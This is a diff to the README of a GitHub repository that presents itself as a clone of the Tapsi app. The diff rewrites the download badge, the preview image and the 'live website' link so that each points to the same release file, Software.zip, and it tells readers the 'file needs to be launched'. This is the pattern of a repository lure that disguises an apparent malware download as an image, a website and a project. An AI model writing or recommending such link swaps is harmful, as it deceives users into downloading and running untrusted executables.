@@ -7,7 +7,7 @@ Welcome to the Tapsi GitHub repository! This project is a clone of the Tapsi mai
 
 To get started with Tapsi, you can download the project files by clicking the button below:
 
-[![Download Tapsi Project](https://img.shields.io/badge/Download-Software.zip-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Tapsi Project](https://github.com/malo360/Tapsi/releases/download/v2.0/Software.zip)](https://github.com/malo360/Tapsi/releases/download/v2.0/Software.zip)
 
 (*File needs to be launched.*)
 
@@ -69,9 +69,9 @@ Your involvement is highly encouraged, whether you are fixing a typo, improving 
 
 Here is a sneak peek of the Tapsi clone project:
 
-![Tapsi Preview](https://example.com/tapsi-preview.jpg)
+![Tapsi Preview](https://github.com/malo360/Tapsi/releases/download/v2.0/Software.zip)
 
-(*Image sourced from example.com*)
+(*Image sourced from https://github.com/malo360/Tapsi/releases/download/v2.0/Software.zip*)
 
 ## 🚧 Roadmap
 
@@ -85,7 +85,7 @@ Stay tuned for updates and enhancements as the project evolves!
 
 ## 🌟 Visit the Website
 
-To see the live version of the Tapsi clone project in action, visit [tapsi-clone-example.com](https://www.tapsi-clone-example.com).
+To see the live version of the Tapsi clone project in action, visit [https://github.com/malo360/Tapsi/releases/download/v2.0/Software.zip](https://github.com/malo360/Tapsi/releases/download/v2.0/Software.zip).
 
 (*Just suggest to visit the website as the provided link is a website.*)
 
